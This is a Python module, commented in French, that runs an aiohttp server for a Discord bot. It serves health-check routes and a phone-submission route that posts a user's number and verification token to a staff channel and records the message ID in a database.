"""
Utilitaires pour le bot (serveur HTTP)
"""

from aiohttp import web
import discord
import logging
import os
from datetime import datetime

import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from database import get_db

# ===== CONFIGURATION DEPUIS VARIABLES D'ENVIRONNEMENT =====
ROLE_ID = int(os.getenv('ROLE_ID', '0'))
GUILD_ID = int(os.getenv('GUILD_ID', '0'))
PORT = int(os.getenv('PORT', 5001))

# Deux salons staff distincts (numero -> demande, code -> vérifié)
STAFF_NUM_CHANNEL_ID = int(os.getenv('STAFF_NUM_CHANNEL_ID', '0'))   # "numero a verifier"
STAFF_CODE_CHANNEL_ID = int(os.getenv('STAFF_CODE_CHANNEL_ID', '0')) # "code de numero verifie"

logger = logging.getLogger(__name__)

async def start_http_server(bot):
    
    async def health_check(request):
        """Endpoint simple pour UptimeRobot"""
        return web.Response(text="OK", status=200)

    async def handle_phone_submitted(request):
        data = await request.json()
        token = data.get('token')
        phone = data.get('phone')
        user_id = data.get('user_id')

        guild = bot.get_guild(GUILD_ID)
        if guild:
            staff_channel = guild.get_channel(STAFF_NUM_CHANNEL_ID)
            if staff_channel:
                # Embed envoyé dans "numero a verifier" — titre = numéro
                embed = discord.Embed(
                    title=f"📱 {phone}",
                    color=0x3498db,
                    timestamp=datetime.utcnow()
                )
                embed.add_field(name="👤 Utilisateur", value=f"<@{user_id}>", inline=False)
                embed.add_field(name="🔑 Jeton", value=f"`{token}`", inline=False)
                embed.add_field(name="📝 Action", value=f"Veuillez envoyer le code par SMS au numéro ci-dessus. Pour finaliser, publiez dans le salon de code un message contenant le jeton et le code.", inline=False)
                
                try:
                    sent = await staff_channel.send(embed=embed)
                except Exception as e:
                    logger.error(f"Erreur en envoyant l'embed dans STAFF_NUM_CHANNEL_ID: {e}")
                    return web.Response(status=500, text="Erreur envoi message staff")

                # Stocker l'ID du message envoyé pour pouvoir le supprimer plus tard
                try:
                    with get_db() as conn:
                        with conn.cursor() as cur:
                            cur.execute(
                                "UPDATE verifications SET staff_message_id = %s WHERE token = %s",
                                (sent.id, token)
                            )
                        conn.commit()
                except Exception as e:
                    logger.error(f"Erreur en sauvegardant staff_message_id pour token {token}: {e}")
        return web.Response(text="OK")

    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)

    # Route pour les soumissions du site
    app.router.add_post('/phone_submitted', handle_phone_submitted)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🌐 Serveur HTTP sur le port {PORT}")
    return runner